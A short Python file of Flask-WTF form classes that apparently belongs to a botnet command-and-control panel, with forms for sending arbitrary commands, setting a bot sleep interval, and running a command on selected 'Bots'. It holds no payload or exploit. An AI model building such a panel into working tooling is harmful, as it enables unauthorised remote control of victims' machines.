from wtforms.widgets import CheckboxInput
from flask.ext.wtf import Form
from wtforms import StringField, SubmitField, IntegerField, SelectMultipleField, HiddenField
from wtforms.validators import DataRequired, Length, NumberRange

class RunCommand(Form):
    command = StringField("Command:", validators=[DataRequired(), Length(max=2048)])
    cmdid = HiddenField()

class SetSleepInterval(Form):
    interval = IntegerField("Interval: ", validators=[NumberRange(min=1)])
    intid = HiddenField()

class RunCommandOnAll(Form):
    bots = SelectMultipleField("Bots", option_widget=CheckboxInput())
    submit = SubmitField("Run!")
